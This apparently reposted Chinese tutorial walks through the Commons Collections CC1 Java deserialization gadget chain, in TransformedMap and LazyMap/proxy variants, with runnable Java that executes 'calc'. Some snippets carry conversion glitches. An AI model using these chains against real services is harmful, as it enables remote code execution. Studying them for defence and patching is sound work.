<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzkxNjQyMjcwMw==&mid=2247484242&idx=1&sn=a2fc1227d61e8731fc9234e5e28e4220&scene=21#wechat_redirect)

**前言  
**

学习反序列化就肯定少不了学习 CB，CC，CK 等已有的链子来帮我我们理解各大反序列化漏洞的挖掘思路，漏洞利用，这里团队的 XJiu 师傅就带兄弟们先学习一下 CC1 这个经典链，它适用的依赖版本经常出现在框架, cms 以及中间件中，兄弟们冲!!!  

**原理**

通过反射调用类的方法达到命令执行

例：

Runtime.getRuntime().exec(“clac”); ![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFushg8ErQUdWzyUDzLpcpJwKDLLtxCJxqCVCmWOno1ibUgP2RYfn2icqBA/640?wx_fmt=png)

**概述**  

反射调用

代码如下

```
package org.example;
import java.io.IOException;
import java.lang.reflect.Method;
public class Main {
    public static void main(String[] args) throws Exception {
        Class c = Class.forName("java.lang.Runtime");
        Method getRuntimeMethod =  c.getMethod("getRuntime",null);
        Method getexecMethod = c.getMethod("exec",String.class);
        Runtime run =  (Runtime)getRuntimeMethod.invoke(null,null);
        getexecMethod.invoke(run,"calc");
    }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFud3wkLA7JXgS0ibBib5KqmIQq3w3SJp3BUcpPuibLrwOFbibb9L9ygbsSHA/640?wx_fmt=png)

Class.forName------> 反射获得 Runtime 类

c.getMethod -------> 获得 getRuntime 和 exec

通过 getRuntimeMethod.invoke 方法 得到 Runtime 这个对象

execMethod.invoke 方法 执行命令

**CC1**  

### InvokerTransformer  

```
包 org.apache.commons.collections.functors

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuMMzWl0fU4zgMdMyVMaS7ibJPwNAeWGPZShnCqm4VKyLJxwMvd9F3IicQ/640?wx_fmt=png)

### Transform  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFufGptwOia2wTekeicIsibtialic6Bha2DG5rDuqE9eWo1ddupEwAB2V3otmQ/640?wx_fmt=png)

这里发现通过反射调用类，通过 invoke 方法执行

#### 本地调用  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuXrvEC956RjkCx9wt1a9NJSBrZSakaOS5ULianYR4DEDVprdhiaaSZdEw/640?wx_fmt=png)

这里直接调用 InvokerTransformer. Transform 方法，执行命令  

### 查找 Transform 的调用  

这里跟进当前类它得接口名 TransFormer

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuNXepyY9DTicHXLyZoBNrP1jjpbaQT4zic62ich5XotORkVXNm5op64lBg/640?wx_fmt=png)

跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuicibzNP4ey0JLymjfAeO9H3GhyxasTYErKzRa4cjwdn098HI7OcrWpyw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuS0v4vLpKu7DKWARLwhCibx6qw9KLbRTyTXibQMQUTsmUHcT8wRYvYic9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFulibVw7DmH3YAglWZQVJo9ibFYicHOE5MVlaOzktITWibw8oHHFL7tWTfrA/640?wx_fmt=png)

Protected 方法在类里面调用，无法控制，但 valueTransformer 是可以控制得，继续跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuYqib2IKMYlA4z0FjAFKmaM2EIHYcTACLPbOfTwOvZqIiauriam8lrdWZw/640?wx_fmt=png)

跟进后发现 valueTransformer 得值是通过 TransformedMap 这个方法来传递得，继续跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu44NCfZ9MAaDlJ56D8ADDL2jAzQiafAgUIkHhI5wkqttIibNSpTCt1VNQ/640?wx_fmt=png)

发现 TransformedMap 的方法是上一个静态方法 decorate 的返回值，里面的参数是可以控制了。

(不可控)Checksetvalue (valueTransformer)----> (不可控)TransformedMap (valueTransformer)  ------> （可控）decorate（valueTransformer（可控））

Checksetvalue 怎么才能调用?

Next 跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu0VQeP57ExicquWclECv2phqwJK5SIxwWPK6k0eyoQZyCsvGNgJYUhOA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFunvqMgtIvrOG6aicKK4XmluBPsRicePmyGI4nxylGJEzkAuLiao4cBxsWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFupD02bPeP00Y0dHqRXozPWjgVH1yGzOunYIvh4FEMvzqgq14wZ1xqfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFunnb5rASdpAZ6rMoWtYvanDjSWnu2wldhINoAKNz5AkINn6d8UZk0xQ/640?wx_fmt=png)

#### 代码实现

```
package org.example;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class Main {
    public static void main(String[] args) throws Exception {
        Runtime run = Runtime.getRuntime();
        HashMap         <Object< span>,Object> hashmap = new HashMap<>();
        InvokerTransformer invokerTransformer = (InvokerTransformer) new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        hashmap.put("value","value");
        Map           <Object< span>,Object> transformedMap = TransformedMap.decorate(hashmap,null,invokerTransformer);
        for(Map.Entry entry:transformedMap.entrySet()){
            System.out.println(entry.setValue(run));
        }
    }
}
或者用这三句去替换 Runtime run = Runtime.getRuntime();
Class clazz = Class.forName("java.lang.Runtime");
Method GetMethod =  clazz.getMethod("getRuntime",null);
Runtime r = (Runtime)GetMethod.invoke(null,null);

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuvvEElNk4Nvh9eDFJJnJHzbFtKB7QO2ViacTUMnGJUnTmNFX5aQu24Ww/640?wx_fmt=png)

这里实现了 一半的 CC1 链（不完整）

NEXT

这里只用 InvokerTransformer 去调用 runtime 的方法的命令，代码如下

```
package org.example;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class Main {
    public static void main(String[] args) throws Exception {
        //invokerTransformer 执行命令                  
        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
        Runtime run = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(run);
    }
}

```

### ChainedTransformer  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFubicDKWtOaLdWTEWicbeLaqTVOib8qyjnwzz70icDAnYWsibxGcpwdZE7t8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu30L20sogUWEiaH8Ow3QEO2mc9VyJGWorDD1TEF0zQuavyIc8B8snV1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu63oSeKsNDpiapke44mSE7iaiaeials2Vic2icse0RJHx9kaia28TEcbqhLiahw/640?wx_fmt=png)

### 代码实现

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformer =  new Transformer[]{
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        new ChainedTransformer(Transformer).transform(Runtime.class);
    }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu4toIP66kicAt0ybopxaKURd2rFYJwU0yLyUWTicGiclHbS3qqUDY1gnRw/640?wx_fmt=png)

这里可以发现 Transform(Object obj) 这个 obj 形参只能放 Runtime.class 我们可以放其他的对象吗？

继续跟进

发现 org.apache.commons.collections.functors. ConstantTransformer

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFubLH2CTFgK0jVKBvJ3Fj8OQxUF1NqQlib1jFnzAicRiaSWVvg1B5qrQetA/640?wx_fmt=png)

接口是 Transformer

ConstantTransformer 这个构造器是 给什么 Object 就返回什么 Object

代码里面跟进尝试  

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformer =  new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        new ChainedTransformer(Transformer).transform("aaaaa");
    }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFupVU4qMicoeWydCRqwBibibzCVxC9INmzIrpkHSatU2iaqZEc6hDbV39BicA/640?wx_fmt=png)

### 断点跟进  

最开始是 “aaaa”

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuJ1Kl1yC8pdjLK3nBLdBpYFibFa5sgNO3Fia8ddKcX5fRxgHIr4h6gViaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFulEwMJg4d0GOh7MLURrz4ZapcVhSfPZRNXRNnPjQbAZibvb3PbJJicffg/640?wx_fmt=png)

在往下面走 发现更改了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFujFWCzkTC390WUNDArnAVhGwEFlhs4icIJrwC02MxplrSvQa0Ocu0KPg/640?wx_fmt=png)

走进了 InvokerTransformer.transform

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuBMvciaSYYmGGwbxNfzzpV9mX0kn6w4ibU1U3vw3gfOPAwHosAGxPKKzw/640?wx_fmt=png)

反序列化漏洞就要用到 ReadObject

这里去找一下 ReadObject 哪里有用到？并且调用了 setValue 这个函数

### ReadObject  

查找调用 setValue 的位置

Java1.8  sun.reflect.annotation.AnnotationInvocationHandler

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuoyMrRHgwYGoJfu7lnqrYgs54efR0sUABmakMKxfljadMEmVsWy3IPA/640?wx_fmt=png)

过掉里面的逻辑部分，进入到 memverValue.setValue

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFur1UWMym8XX5Df6RttzqYyyj0EXLKiaQ8NY4vpXdLFgDw9uVY23ZsGew/640?wx_fmt=png)

代码如下

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformers =  new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
        HashMap         <Object< span>,Object> hashmap = new HashMap<>();
        hashmap.put("value","value");
        Map           <Object< span>,Object>  transformedMap =  TransformedMap.decorate(hashmap,null,chainedTransformer);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj =  constructor.newInstance(Target.class,transformedMap);
        Seria s  = new Seria();
        //s.seria(obj);                        
        s.unseria();
    }
}
</Object<>
</Object<>

```

#### 链条  

<table cellspacing="0" cellpadding="0" border="1"><tbody><tr><td width="553" valign="top"><p>AnnotationInvocationHandler.reobject()---&gt;</p><p>&nbsp;&nbsp; Map(TransformedMap).entryset()---&gt;</p><p>&nbsp;&nbsp;&nbsp; &nbsp; ChainedTransformer.transform()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ConstantTransformer.transform()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TransformerMap.checksetValue()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TransformerMap.setvalue()---&gt;&nbsp;&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InvokerTransformer.transform()---&gt;</p></td></tr></tbody></table>

最终进入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuRpshQJd9esHzyzpyZa3egaw5amD3RznQQwEAy55Z1Bj3n0cPeIZ8eg/640?wx_fmt=png)

**LazyMap**  

K  

### JDK 动态代理  

#### newProxyInstance  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuv1ORgsCRfb9tHnYDPcia54Ilic5DDpgVcwz6lsuQKmKL1aWKwaU9A28A/640?wx_fmt=png)

newProxyInstance，⽅法有三个参数：

loader: ⽤哪个类加载器去加载代理对象

interfaces: 动态代理类需要实现的接⼝

h: 动态代理⽅法在执⾏时，会调⽤ h ⾥⾯的 invoke ⽅法去执⾏

这里代码实现一下 newProxyInstance

##### Person 接口  

<table cellspacing="0" cellpadding="0" border="1"><tbody><tr><td width="553" valign="top"><pre>package org.jdk;                  



public interface Person {
    void build(String name);
}

     
</pre><br></td></tr></tbody></table>

##### TestPerson  

继承接口 实现 build 方法

<table cellspacing="0" cellpadding="0" border="1"><tbody><tr><td width="553" valign="top"><pre>package org.jdk;



public class TestPerson implements Person{
    @Override
    public void build(String name) {
        System.out.println(name);
    }
}

     
</pre><br></td></tr></tbody></table>

##### PersonHandler  

这里继承 接口 InvocationHandler  实现其 invoke 方法

```
package org.jdk;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
public class PersonHandler implements InvocationHandler {
    private Person person;
    public PersonHandler(Person person){
        this.person = person;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.err.println("A");
        method.invoke(person,args);
        System.err.println("B");
        return null;
    }
}

```

Proxy  

调用 newProxyInstance

自动调用 PersonHandler 里面的 invoke 方法  

```
package org.jdk;
import java.lang.reflect.Proxy;
public class proxy {
    public static void main(String[] args) {
        Person person = (Person) Proxy.newProxyInstance(Person.class.getClassLoader(),new Class[] {Person.class},new PersonHandler(new TestPerson()));                  
     /*   Proxy.newProxyInstance() 参数                  
            loader: ⽤哪个类加载器去加载代理对象                  
            interfaces:动态代理类需要实现的接⼝                  
            h:动态代理⽅法在执⾏时，会调⽤h⾥⾯的invoke⽅法去执⾏                  
     */
        person.build("hello");
    }
}

```

##### 断点跟进  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu3dSzibNsHRTjxFdO3xNGAetQSBhqsJGyMMIyfvCAp0ox9b78moPWQoA/640?wx_fmt=png)

来到 PerHandler

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuJyGVemoVj0ialU5NPlv8nibIT3ZuEzbvyic8SCa9mLREKBlSJBuouhIaw/640?wx_fmt=png)

调用 build 这个方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuRmiagF4ia9MzLY5wic51ZNoBH1Wc54xs4DyYJvsiaYib5icibuhOrWzkkweDA/640?wx_fmt=png)

走进 PersonHandler.invoke 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu7JB491H28HCN2jLReJJndZfIKiaF49zkVuGPUYctCyGqo81IeHMa4ZA/640?wx_fmt=png)

然后打印

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuVufxNnQwjzXVh5q9yxIqxJvamUu9OCwHPBPv5C9dYCNT73mniaTdBeQ/640?wx_fmt=png)

LazyMap.transformer  
---------------------

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuv8Odico0cbL5F3sbPRicxjPbY9rDZRaLLMK97RRf8iaMvY2lY04ABlNXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuAaFastbrpgRoG4A0IJGeuk7FyOemniamEFZwzftFpaaylcOHicCQWqsA/640?wx_fmt=png)

LazyMap 继承 Map 接口，发现其 get 方法调用了 transform 这个方法

This.factory 其类型也是 transformer

这里发现当没有 key 的时候就可以调用到里面的 transform 方法

#### 代码实现

```
ackage org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformers =  new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
        HashMap         <Object< span>,Object> hashmap = new HashMap<>();
        hashmap.put("value","value");
        Map           <Object< span>,Object>  lazymap =  LazyMap.decorate(hashmap,chainedTransformer);
        lazymap.get("aaaa");
    }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFutZoLsgUYat2eBsmvK3UmwTVBL6O2UPpq0E1MDbPvk5QBkJQak3l7xw/640?wx_fmt=png)

#### 寻找 get 方法调用  

继承 Map 接口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFusJP5VrYXNM3ExHKnwC3yIsibySfx8QRWPfciahKY2edMrWcTWymFVMfQ/640?wx_fmt=png)

发现 AnnotationInvocationHandler.invoke 方法中调用了 get 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuyQXIfl4eF7HoCzRNicEsicjZQBu8YZz4I6OdvacjCA7z4TiafwDFYjrEQ/640?wx_fmt=png)

发现起 memberValues 是可控的 并且类型为 Map

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFunhELOa8NrEWUtDIIJJzf6dmhc9hn60vcNibgPVDPMZsy7mjymcdSykA/640?wx_fmt=png)

#### 动态代理 AnnotationInvocationHandler  

代码实现

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformers =  new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
        HashMap         <Object< span>,Object> hashmap = new HashMap<>();
        hashmap.put("value","value");
        Map           <Object< span>,Object>  lazymap =  LazyMap.decorate(hashmap,chainedTransformer);
//        lazymap.get("aaaa");                        
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class,lazymap);
        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        proxymap.entrySet();
    }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFu1xqSP0jlpxtiaiaEucibVRksfJfF8kJZsUMFIdrm7ERs0KCOeFuKEicDxA/640?wx_fmt=png)

#### 用 ReadObject 执行 JDK 动态代理  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuX8d3q1qsBECVYGicLibqMHGAQicyInM2DVSib7y1APG2CXw9bRqvPWOEicg/640?wx_fmt=png)

拿到这个类 执行其序列化的操作

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFub46STJcgne9191k3uBzB173OvRGeu1qUM3cDmal6yJWffoLymITqLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuEoFAVUK1fRKCGD68icZoGyOFrBhNzL2iaKHPeMNzxlkC0NyajZLAibvibQ/640?wx_fmt=png)

让其反序列化

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuavPgsgIm0bUSdNuoO6DibeIDZ3pZKv6O0zd75x95HZ04ll2kCDOnbJw/640?wx_fmt=png)

#### 链条  

<table cellspacing="0" cellpadding="0" border="1"><tbody><tr><td width="553" valign="top"><p>AnnotationInvocationHandler.readObject()---&gt;</p><p>&nbsp; Map(Proxy).entryset()---&gt;</p><p>AnnotationInvocationHandler.invoke()---&gt;</p><p>&nbsp;&nbsp;&nbsp; LazyMap.get()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;ChainedTransformer.transform()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ConstantTransformer.transform()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; TransformerMap.checksetValue()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TransformerMap.setvalue()---&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InvokerTransformer.transform()</p></td></tr></tbody></table>

最终进入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Opgkh1ZiaWIfEZnSJUdzjFuRpshQJd9esHzyzpyZa3egaw5amD3RznQQwEAy55Z1Bj3n0cPeIZ8eg/640?wx_fmt=png)